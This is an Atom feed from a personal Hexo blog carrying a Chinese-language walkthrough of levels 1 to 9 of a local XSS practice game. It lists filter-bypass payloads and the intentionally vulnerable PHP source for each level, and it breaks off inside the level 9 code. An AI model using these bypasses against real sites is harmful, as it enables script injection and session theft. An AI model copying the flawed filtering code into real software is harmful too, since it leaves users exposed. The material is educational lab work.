<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ST0new Blog</title>
  
  <subtitle>博观而约取，厚积而薄发</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-05T08:39:11.063Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>ST0new</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss通关小游戏</title>
    <link href="http://yoursite.com/2019/10/05/web%E5%AE%89%E5%85%A8/XSS/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <id>http://yoursite.com/2019/10/05/web安全/XSS/XSS闯关小游戏/</id>
    <published>2019-10-05T08:26:06.000Z</published>
    <updated>2019-10-05T08:39:11.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-通关小游戏"><a href="#xss-通关小游戏" class="headerlink" title="xss 通关小游戏"></a>xss 通关小游戏</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>下载 xss 通关小游戏</p><p>文件来自于：<a href="https://www.cnblogs.com/bmjoker/p/9446472.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9446472.html</a></p><blockquote><p>相信phpstudy</p><p>在官网安装最新版的phpstudy，通过360、火绒检查不存在问题后，安装到自定义目录下</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-4e01f94b9b721694.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570177833994.png"></p><p>搭建非常简单，点两下，拖一个文件进去，就好了。</p><h2 id="通关之旅"><a href="#通关之旅" class="headerlink" title="通关之旅"></a>通关之旅</h2><blockquote><p>很张狂的一个小人，不服就来啊</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-e52619f378e42db1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570178216576.png"></p><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><p>第一关可以看到，url处输入的信息，会返回<code>欢迎用户xxx</code> 这让我想去注入一下，话说回来，赶紧看看怎么弹xss吧</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-e3bfd208b18f66e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570178276534.png"></p><p>看一下前端的页面，是否存在过滤，没有绕过，只需要输入弹xss的语句就可以了</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-27c076c5cd8fdaaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570178710972.png"></p><p>上payload</p><blockquote><script>alert(2)</script></blockquote><p>成功</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-04d75558e7ae7e07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570178885846.png"></p><p>最后看一下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将拿到的值 直接放入去echo，xss无疑</p><p>然后测试了一下我收集的xss ，以下都可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRIpT&gt;new class extends confirm`4`&#123;&#125;&lt;/SCripT&gt; //绕过script大小写，括号，alert等函数</span><br><span class="line"></span><br><span class="line">&lt;script&gt;(((confirm)))`666`&lt;/script&gt; // 绕过括号，alert等函数限制</span><br><span class="line"></span><br><span class="line">&lt;script&gt;co\u006efirm(666)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(2)&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;&#123;confirm`NB`&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert`111`&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert`%22xss%22`%3c/script%3e</span><br><span class="line"></span><br><span class="line">其中有的虽然弹了xss 但是没有跳转到下一关</span><br></pre></td></tr></table></figure><h3 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h3><p>看来这一关，有两个位置可以传参， 而且但是发现这两个位置是相同的，所以测试点只有一个</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-41d8eab648e5b9c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570180389460.png"></p><p>看一下前端，传入一个简单的xss，发现<code>&lt;&gt;</code>都被转义了。</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-d284a9c6e4af1bed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570180493035.png"></p><p>试试闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&lt; // 绕过</span><br></pre></td></tr></table></figure><p>这里加“ 的目的是闭合前面的值，之后添加xss脚本即可成功弹shell</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-64e4334b34c3c335.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570181010970.png"></p><p>看看别人是如何弹的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onmouseover=alert(3)&gt; // 需要鼠标移动到输入框</span><br><span class="line">&quot; onclick=alert(4)&gt; // 需要点击</span><br><span class="line">&quot;&gt; &lt;img src = &quot;a&quot; onerror=&quot;alert(5)&quot;&gt;</span><br><span class="line">其实只要有“ 其他都随意了</span><br></pre></td></tr></table></figure><p>在试试fuzz<br><code>劝各位少试 ，崩了别怪我没提醒</code></p><p>差点忘记看源码了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">多了个函数htmlspecialchars</span><br><span class="line">看看他的用法</span><br><span class="line"></span><br><span class="line">将特殊字符转换为 HTML 实体， 包括： &amp; &quot; &apos; &lt; &gt;</span><br><span class="line">所以直接去执行简单的payload都会被过滤，但是过滤不严格，使用“&gt; 闭合之后 函数就是失效了</span><br></pre></td></tr></table></figure><h3 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h3><blockquote><p>先用简单的去看看</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;alert(6)&lt;/script&gt; //&quot;  &lt; &gt; 都被绕过&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-4d7334bbd44f9507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570183909634.png"></p><p>那么就需要没有这几个特征的,比如上一关提到的 点击事件和划过窗口事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmousedown=&apos;alert(7)  闭合</span><br><span class="line">&apos; onclick=&apos;alert(8)</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;onmousedown=&apos;alert(9) &apos;&gt;</span><br><span class="line">&apos; onmousedown=alert(10)// 注释</span><br><span class="line">&apos; onclick=alert(11)//</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;onclick=alert(12)// &apos;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-c868e170b7fcf8a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570184810646.png"></p><p>看一下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">这里也用了htmlspecialchars ，但是通过 .. 去追加的，所以不能直接使用双引号进行绕过</span><br><span class="line">从value中可以看到单引号引起，所以使用单引号去闭合。</span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><blockquote><p>尝试拿payload 去试，看看 过滤了什么<br>发现之后’ 没有被过滤，那么 这里很可能只有单引号属于正常的</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-a8307174dac8de02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570186377800.png"></p><p>尝试双引号闭合，发现这道题和上一道可能就是单引号和双引号的区别了</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-140b6f139bd47101.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570186447377.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里添加一个payload</span><br><span class="line">&quot;onfocus=alert(13) autofocus=&quot;   //onfocus 事件在对象获得焦点时发生。同样可以放在第三关去绕过</span><br><span class="line">或者 </span><br><span class="line">&quot; onfocus=alert(14) //</span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>先查看过滤的内容 经过测试发现 on，script被过滤了，这时尝试使用其他的函数绕过</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-214e4b663b611ad4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188039661.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-57017760f651ebe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188154325.png"></p><p>这时想到还有javascript可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot;&gt;&lt;iframe src=javascript:alert(15)&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;iframe src=&quot;javascript:alert(16)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-99c6e9d62e2d7eb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188390066.png"></p><p>但是没有出来下一关提示，别急，还有，herf也可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(17)&quot;&gt;</span><br></pre></td></tr></table></figure><p>点击标签，成功绕过<br><img src="https://upload-images.jianshu.io/upload_images/18851353-bd78d719e2df57d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570188777396.png"></p><p>看下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先转了小写， 大小写失效了，之后替换，script失效了，然后on 事件也失效了，之后就可以想想其他过滤， href可以，ifame 也可以，&lt;&gt; 正常，所以限制也就少了<br>所以这次可以通过javascript去执行语句，将javascript嵌套到href或ifame都可以实现绕过</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><blockquote><p>随便输入，查看过滤了什么</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-239f436b3718ebe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189440237.png"></p><p>‘ o_nmousedown=alert(8)//  script也被过滤了</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-beda4b67d17e6eda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189440237.png"></p><p>试试上一题的payload “&gt;<a href="javascript:alert(19)" target="_blank" rel="noopener"></a></p><p>href 也被过滤了</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-bb36fb53a6bed160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189606811.png"></p><p>src 也被过滤了</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-42bd30262c324f23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189606811.png"></p><p>这时 有点蒙了，都过滤了，怎么测，想起来还有个大小写没有试<br>果然 天无绝人之路 大小写没有过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;iframe sRc=javascript:alert(20)&gt;</span><br><span class="line">&quot;&gt;&lt;a hREf=&quot;javascript:alert(21)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-8d715f68b44d517b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570189698861.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">可以当做黑名单过滤</span><br><span class="line">script，on，src，data，href</span><br><span class="line">这里首次出现了data，查阅一下资料，看看data是如何触发xss的</span><br><span class="line">data:text/html,alert(&apos;xss&apos;);&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><blockquote><p>方法不变测试过滤</p><p>这次是检测到删除，双引号被过滤</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-a16b6019edbc4af7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570190052543.png"></p><blockquote><p>删除 如果是匹配删除，那么双写即可绕过</p><p>paylaod: “&gt;<scscriptript>alert(/xss/)</scscriptript></p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-840f4e0369e15e7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570190355881.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">果然是 匹配到函数就删除，这样 双写很容易绕过</span><br></pre></td></tr></table></figure><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><blockquote><p>测试过滤字符，测试onclick,之后查看友情链接，发现on 被替换了data，script，href等都被替换了，这里前面的方法都失效了，</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-070dae2fdffebfcf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570190584596.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-827d3cb4419b8c89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570190610967.png"></p><blockquote><p>百度一下，发现可以通过编码去绕过，通过html字符实体转换 将 r 换为&amp;#x72</p><p>成功绕过替换</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">javascrip&amp;#x74;:alert(22)</span><br><span class="line">javasc&amp;#x72;ipt:alert`1`</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-086fea2968c66894.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570191396570.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">前面的过滤不说了，引号被编码了，这样html实体无法使用00去截断，</span><br></pre></td></tr></table></figure><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><blockquote><p>常规判断<br>这次没有任何回显，只给了不合法，难度比之前的有很大的提升，这次绕过让我忽略了一个问题，友情链接没有网址那叫链接吗，百度了下绕过，发现一只忽略了一个最重要的问题</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">javascrip&amp;#74;:alert(23)//http://www.baidu.com&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-2bbb4b67ab6eaa73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570197241007.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br><span class="line">&#123;</span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line"> &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span 